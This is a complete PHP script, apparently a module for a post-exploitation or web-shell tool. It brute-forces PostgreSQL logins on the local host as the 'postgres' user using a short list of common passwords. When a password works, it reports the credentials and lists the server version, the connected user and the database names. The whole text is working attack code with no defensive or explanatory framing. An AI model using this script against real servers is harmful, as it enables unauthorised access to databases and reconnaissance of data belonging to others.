ob_start();

if (!extension_loaded('pgsql')) {
    ob_end_clean();
    return "ERROR: pgsql extension not available";
}

$host = '127.0.0.1';
$port = 5432;
$username = 'postgres';
$delay = 1;

$passwords = [
    '',
    'postgres',
    'password',
    '123456',
    'admin',
    'root',
    'toor',
    'qwerty',
    '123456789',
    'letmein'
];

try {
    $success = false;
    $attempted = 0;
    $output = "[+] Starting PostgreSQL brute-force on $host:$port\n";
    $output .= "[+] Target user: $username\n";
    $output .= "[+] Passwords to try: " . count($passwords) . "\n\n";

    foreach ($passwords as $pwd) {
        $attempted++;
        $output .= "[$attempted] Trying: '$pwd' ... ";

        $conn_str = "host=$host port=$port dbname=postgres user=$username password='$pwd' connect_timeout=3";

        $conn = @pg_connect($conn_str);

        if (!$conn)
        {
            $last_error = error_get_last();
            if ($last_error && preg_match('/(Connection refused|timeout|No such file)/i', $last_error['message'])) {
                ob_end_clean();
                return "ERROR: Cannot connect to PostgreSQL ($host:$port) - service down or filtered";
            }
            $output .= "FAILED (Invalid credentials)\n";
        } else {
            $output .= "SUCCESS!\n";
            $output .= "\n[+] CREDENTIALS FOUND:\n";
            $output .= "    Host: $host:$port\n";
            $output .= "    User: $username\n";
            $output .= "    Pass: " . ($pwd === '' ? '(empty)' : $pwd) . "\n\n";

            $version_result = pg_query($conn, "SELECT version()");
            $version = pg_fetch_row($version_result)[0] ?? 'unknown';

            $user_result = pg_query($conn, "SELECT current_user");
            $current_user = pg_fetch_row($user_result)[0] ?? 'unknown';

            $db_result = pg_query($conn, "SELECT datname FROM pg_database WHERE datistemplate = false");
            $dbs = [];
            while ($row = pg_fetch_row($db_result)) {
                $dbs[] = $row[0];
            }

            $output .= "[+] PostgreSQL Version: " . substr($version, 0, 80) . "\n";
            $output .= "[+] Connected as: $current_user\n";
            $output .= "[+] Databases:\n    - " . implode("\n    - ", array_slice($dbs, 0, 10));
            if (count($dbs) > 10) {
                $output .= "\n    ... (+ " . (count($dbs) - 10) . " more)";
            }
            $output .= "\n";

            pg_close($conn);
            $success = true;
            break;
        }

        if ($conn) pg_close($conn);

        if (!$success && $attempted < count($passwords)) {
            sleep($delay);
        }
    }

    if (!$success) {
        $output .= "\n[!] No valid password found.\n";
    }

    ob_end_clean();
    return $output;

} catch (Exception $e) {
    ob_end_clean();
    return "ERROR: PostgreSQL brute-force failed - " . $e->getMessage();
}
